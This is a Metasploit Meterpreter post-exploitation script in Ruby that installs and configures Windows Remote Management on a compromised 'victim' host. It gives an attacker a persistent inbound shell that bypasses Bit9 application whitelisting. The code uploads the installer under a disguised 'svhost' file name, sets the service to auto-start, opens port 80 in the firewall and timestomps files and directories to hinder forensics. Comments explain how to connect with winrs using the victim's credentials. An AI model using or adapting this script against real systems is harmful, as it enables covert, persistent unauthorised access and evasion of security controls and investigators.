#
# Meterpreter script that enables Windows Remote Management
#   on target, if not present WinRM is uploaded and installed

# Only works on WinXP and above

# WinRM is a bit convoluted, this script will install the WinRM service on a 
#   victim which acts as a WinRM Server, you would connect to the victim from a 
#   Windows client (attacker) which also has winrm installed.  The script
#   configures WinRM to use http on port 80 (you can change it to SSL, but
#   I'm way too lazy to try and work that shiz out).  You can then connect to
#   the victim using Windows Remote Shell (WinRS) which is a WinRM shell client
#   **NOTE** you **MUST** add the victim as a trusted host to supply explicit local creds
#   otherwise your winrm client will negoiate up to Kerberos/Domain auth
#   To do this, on your attacking windows machine running wWnRS, you must run:
#	> winrm set winrm/config/client @{TrustedHosts=\"VICTIMHOST\"}
#   and finally make the connection with:
# 	> winrs -r:VICTIMHOST -u:VICTIMHOST\\user cmd

# Honestly, since you need creds, and you obviously already have a meterpreter shell
#   this only useful in one particular instance.  When you want a persistent shell of some
#   kind and can't use the persistence script due to application white listing such as Bit9.
#   Bit 9 in lockdown mode won't allow anything to run, even a vbs script, that isn't white-
#   listed or signed by Microsoft/or other approved source.  Well guess what?  WinRM is signed
#   by Microsoft 

# Keep in mind, you are connecting TO the victim (it's not a reverse connection), so NATs
#   and such will cause issues.  I tried to do some hole punching by having Meterpreter
#   send out a packet to the client, sourced from port 80, but there's no way for 
#   Meterpreter to dictate the source port yet.  So you'd have to be local on the network,
#   or farm multiple hosts out of the network through a single meterpreter session 
#  (like on a server, servers often have a hard time with Bit9 for various reasons, so you 
#   can probably get persistence there)

# Tested on Windows XP SP3 with Bit9 running in lockdown mode (parity.exe ver 5.1)
# There is notional support for Vista/7/2008, just use the config only option (-co) since
#   WinRM is installed by default on those platforms.  I'll try to test them soon.  But I know
#   the uninstall options won't work for those platforms (which you probably don't want to do
#   anyways since WinRM is installed by default).  You may want to timestomp though.

# And yes, my code is weak, still learning...   --kernelsmith

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"	=> [ false,  	"This help menu"],
	"-c"	=> [ false,  	"Only check if winrm installed, don't upload anything"],
	"-p"	=> [ true,   	"Path of directory containing winrm installer(s) if not pwd"],
	"-u"	=> [ false,	"Uninstall winrm now, if installed"],
	"-v"	=> [ false,	"Be verbose, show results of individual commands" ],
	"-t"	=> [ false,	"Timestomp the winrm files" ],
	"-co"	=> [ false, 	"Configure only, don't install" ]
	# TODO:  add switches to allow customization of winrm install
	# TODO:  send pkt from port 80 to punch holes in NATs
	# TODO:  Vista/2008 changes
	# TODO:  Delete uninstall folder?
)

#
# Default parameters
#
docheckonly = false
douninstall = false
installerpath = "./"
$verbose = false
doconfigonly = false
stomp = false

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_status("Install and/or configure Windows Remote Management" + opts.usage)
		raise Rex::Script::Completed
	when "-c"
		docheckonly = true
	when "-p"
		installerpath = val || "./"
	when "-u"
		douninstall = true
	when "-v"
		$verbose = true
	when "-t"
		stomp = true
	when "-co"
		doconfigonly = true
	end
end

# fxn to get name of proper installer, uninstaller, & install/uninstall commands, returns hash
# TODO:  installer type?
def getInstallInfo(session,instpathstart="./")
	hashish = Hash.new
	#set defaults
	hashish =	 {		'installer'	=>	instpathstart,
					'uninstaller'	=>	session.fs.file.expand_path("%windir%"),
					'installcmd'	=>	"/quiet /passive /norestart",
					'uninstallcmd'	=>	"/quiet /passive /norestart",
					'downloadpage'	=>	'http://www.microsoft.com/downloads/details.aspx?familyid=845289ca-16cc-4c73-8934-dd46b5ed1d33&displaylang=en'}
	# WinXP(x86)		->      WindowsXP-KB936059-x86-ENU.exe
	# Server2003(x86)    	->      WindowsServer2003-KB936059-x86-ENU.exe
	# WinXP/Server2003(x64) ->      WindowsServer2003.WindowsXP-KB936059-x64-ENU.exe
	# http://www.microsoft.com/downloads/details.aspx?familyid=845289ca-16cc-4c73-8934-dd46b5ed1d33&displaylang=en
	# Windows Server 2003 R2:  The Winrm quickconfig command is not available. 
	# For more information about Windows Server 2003 R2 configuration, see
	# http://technet.microsoft.com/en-us/library/cc785056(WS.10).aspx

	begin
		winversion = session.sys.config.sysinfo
		if winversion['OS']=~ /Windows XP/
			print_status("Windows XP detected, checking architecture ...")		
			if winversion['Architecture']=~/x86/
				print_status("x86 detected")
				hashish['installer'] << "WindowsXP-KB936059-x86-ENU.exe"
				hashish['uninstaller'] << "\\$NtUninstallKB936059$\\spuninst\\spuninst.exe"
			elsif winversion['Architecture']=~/x64/
				print_status("x64 detected")
				hashish['installer'] << "WindowsServer2003.WindowsXP-KB936059-x64-ENU.exe"
				hashish['uninstaller'] << "\\$NtUninstallKB936059$\\spuninst\\spuninst.exe"
			else
				# TODO: error
				print_error("Did not recognize architecture")
				raise Rex::Script::Completed
			end
		elsif winversion['OS']=~/Windows Server 2003/
			print_status("Windows Server 2003 detected, checking architecture ...")
			if winversion['Architecture']=~/x86/
				print_status("x86 detected")
				hashish['installer'] << "WindowsServer2003-KB936059-x86-ENU.exe"
				hashish['uninstaller'] << "\\$NtUninstallKB936059$\\spuninst\\spuninst.exe"
			elsif winversion['Architecture']=~/x64/
				print_status("x64 detected")
				hashish['installer'] << "WindowsServer2003.WindowsXP-KB936059-x64-ENU.exe"
				hashish['uninstaller'] << "\\$NtUninstallKB936059$\\spuninst\\spuninst.exe"
			else
				# TODO: error
				print_error("Did not recognize architecture")
				raise Rex::Script::Completed
			end
		elsif winversion['OS']=~/Windows Vista/ or winversion['OS']=~/Windows Server 2008/ or winversion['OS']=~/Windows 7/
			print_status("Windows Vista, Server 2008, or 7 detected, checking architecture ...")
			hashish['uninstaller'] = "pkgmgr.exe"
			hashish['installcmd'] = "/quiet /norestart"
			# TODO Do you really want to uninstall it since it comes with these OSs?

			# pkgmgr /up:PackageName~publicKeyToken~x86~~ver
			if winversion['Architecture']=~/x86/
				print_status("x86 detected")
				# TODO:  need to prepend wusa.exe?
				hashish['installer'] << "Windows6.0-KB950099-x86.msu"
				hashish['uninstallcmd'] = " /up:Windows-Management-Protocols-Package-TopLevel~31bf3856ad364e35~x86~~6.0.6002.18018 /quiet"
				hashish['downloadpage'] = 'https://connect.microsoft.com/WSMAN/Downloads/DownloadDetails.aspx?DownloadID=15748'
			elsif winversion['Architecture']=~/x64/
				print_status("x64 detected")
				# TODO:  need to prepend wusa.exe?
				hashish['installer'] << "Windows6.0-KB950099-x64.msu"
				hashish['uninstallcmd'] = "/up:Windows-Management-Protocols-Package-TopLevel~31bf3856ad364e35~amd64~~6.0.6002.18018 /quiet"
				hashish['downloadpage'] = 'https://connect.microsoft.com/WSMAN/Downloads/DownloadDetails.aspx?DownloadID=15749'
			else
				# TODO:  error
				print_error("Could not identify system architecture")
				raise Rex::Script::Completed
			end
		else 
			# TODO:  error, operating system not recognized as being WinXP or higher
			print_error("OS not recognized as being WinXP or above")
			raise Rex::Script::Completed
		end
		hashish
	rescue ::Exception => e
		print_error("Error detecting OS: #{e.class} #{e}")
	end
end

# This function was lifted from http://www.offensive-security.com/metasploit-unleashed/
# returns string = path to file uploaded
def upload(session,file,trgloc = nil,page="http://www.microsoft.com")
	if not ::File.exists?(file)
		raise "File to upload (#{file}) does not exist!  Try downloading it from #{page} to the msf directory (usually /opt/metasploit3/msf3)"
	else
		location = trgloc || session.fs.file.expand_path("%TEMP%")
		begin
			if file =~ /S*(.exe)/i
				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
			else
				fileontrgt = "#{location}\\TMP#{rand(100)}"
			end
			print_status("Uploading #{file} as #{fileontrgt}...")
			session.fs.file.upload_file("#{fileontrgt}","#{file}")
			print_status("#{file} uploaded as #{fileontrgt}")
		rescue ::Exception => e
		print_error("Error uploading file #{file}: #{e.class} #{e}")
		end
	end
	fileontrgt
end	

# much of this function lifted from darkoperator, Carlos Perez
# fxn runs a windows command on target and returns results as string
def runcmd (session,cmd)
	cmdout = ""
	r = ''
	session.response_timeout = 120
	begin
		print_line "Running command #{cmd}" if $verbose
		r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
		while(d = r.channel.read)
			cmdout << d
		end
		r.channel.close
	rescue ::Exception => e
		print_error("Error while running #{cmd}: #{e.class} #{e}")
	end
     cmdout
end

def uacenabled?(session)
        ret = false
        winversion = session.sys.config.sysinfo
        if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
                if session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
                        begin
                                print_status("Checking if UAC is enabled .....")
                                key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                                if key.query_value('Identifier') == 1
                                        print_status("UAC is Enabled")
                                        ret = true
                                end
                                key.close
                        rescue::Exception => e
                                print_error("Error Checking UAC: #{e.class} #{e}")
                        end
                end
        end
        return ret
end

def stompfiles(session,files)

	windir = session.fs.file.expand_path("%WinDir%")
	files.each do |f|
		begin
			session.core.use("priv")
			fl2clone = windir + "\\system32\\chkdsk.exe"
			print_status("\tChanging file MACE attributes on #{f} to match #{fl2clone}")
			session.priv.fs.set_file_mace_from_file(f, fl2clone)
		rescue ::Exception => e
			print_status("Error changing MACE on #{f}: #{e.class} #{e}")
		end
	end
end

def stompdirs(session, dirs)
	dirs.each do |dir|
		begin
			session.core.use("priv")
			print_status("\tBlanking MACE attributes on files in #{dir}")
			session.priv.fs.blank_directory_mace(dir)
		rescue ::Exception => e
			print_status("Error blanking MACE on #{dir}: #{e.class} #{e}")
		end
	end
end

def configure(session)
	# Configure WinRM
	print_status("Configuring WinRM")
	print_status("Setting WinRM service to auto start")
	runcmd(session,"cmd.exe /c sc config \"WinRM\" start= auto")
	print_status("Starting the WinRM service")	
	runcmd(session,"cmd.exe /c net start WinRM")
	print_status("Setting WinRM to use HTTP")
	runcmd(session,"cmd.exe /c winrm create winrm/config/Listener?Address=*+Transport=HTTP")
	print_status("Opening port 80 in the host firewall")	
	runcmd(session,"cmd.exe /c netsh firewall add portopening TCP 80 \"Windows Remote Management\"")
	print_line("NOTE you **MUST** add the victim as a trusted host to supply explicit creds")
	print_line("	otherwise your winrm client will negoiate up to Kerberos/Domain auth")
	print_line("	To do this, on your attacking windows machine running winrs, you must run:")
	print_line("	> winrm set winrm/config/client @{TrustedHosts=\"VICTIMHOST\"}")
	print_line("	and connect with:")
	print_line("	> winrs -r:VICTIMHOST -u:VICTIMHOST\\user cmd")
	print_line("See the following for details:")
	print_line("http://msdn.microsoft.com/en-us/library/aa384295(VS.85).aspx")
end

#
# "MAIN"
#
if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
	print_line("Not runing as SYSTEM, hopefully meterpreter is running with admin rights")
end
installinfo = getInstallInfo(client,installerpath)
winrmpath = client.fs.file.expand_path("%SystemRoot%")+"\\system32\\"
# check if winrm already exists
if client.fs.dir.entries(winrmpath).grep(/winrm\.cmd/) != []
	# winrm found, no need to install
	print_status("WinRM already exists")
	if douninstall
		print_status("Uninstalling WinRM")
		runcmd(client,"cmd.exe /c #{installinfo["uninstaller"]} #{installinfo["uninstallcmd"]}")
		runcmd(client,"cmd.exe /c del /f /q /s #{winrmpath}\winrm")
		print_status("Done")
	end	
	if doconfigonly
		configure(client)
	end
	if stomp
		print_status("Changing Modified, Access, and Created times")
		system32 = client.fs.file.expand_path("%SystemRoot%")+"\\system32\\"
		stompage = ["#{system32}"+"winrm.cmd", "#{system32}"+"winrm.vbs"]
		stompfiles(client,stompage)
		stompage = ["#{system32}"+"winrm\\"]
		stompdirs(client,stompage)
	end
else
	print_status("WinRM is NOT present on this host")
	if !docheckonly and !doconfigonly and !douninstall
		#do upload, and install
		# TODO:  need to prepend Vista/2008 tgtloc with wusa.exe?
		if uacenabled?(client)
			print_error("UAC is enabled, you can't install jack")
		else
			print_status("Uploading winrm installer ")
			tgtloc = upload(client,installinfo["installer"],nil,installinfo['downloadpage'])
			print_status("Installing WinRM with #{tgtloc}, give me a few minutes")
			runcmd(client,"cmd.exe /c #{tgtloc} #{installinfo["installcmd"]}")
			print_status("Deleting #{tgtloc}")
			runcmd(client,"cmd.exe /c del /F /Q \"#{tgtloc}\"")
			# TODO:  add timestomp?
			# TODO:  allow for customization of winrm install?
			# TODO:  delete uninstaller folder?
			configure(client)
			if stomp
				print_status("Changing Modified, Access, and Created times")
				system32 = client.fs.file.expand_path("%SystemRoot%")+"\\system32\\"
				stompage = ["#{system32}"+"winrm.cmd", "#{system32}"+"winrm.vbs"]
				stompfiles(client,stompage)
				stompage = ["#{system32}"+"winrm"]
				stompdirs(client,stompage)
			end
		end
	end

	print_status("Done")
end

# If the firewall is disabled, the quickconfig command will fail.  
# The firewall can either e started in Services long enough to run 'winrm qc' or
# the commands below can be run:
# sc config "WinRM" start= auto
# net start WinRM
# winrm create winrm/config/Listener?Address=*+Transport=HTTP
# netsh firewall add portopening TCP 80 "Windows Remote Management"
# from http://blogs.technet.com/

# quickconfig must be run with admin privs and does the following:
# * Starts the WinRM service, and sets the service startup type to auto-start.
# * Configures a listener for http or https
# * Defines firewall exceptions for the WinRM service, and opens 80/443
#
# Note:  quickconfig creates a firewall exception only for the current user profile. 
# If the firewall profile is changed, quickconfig should be rerun.
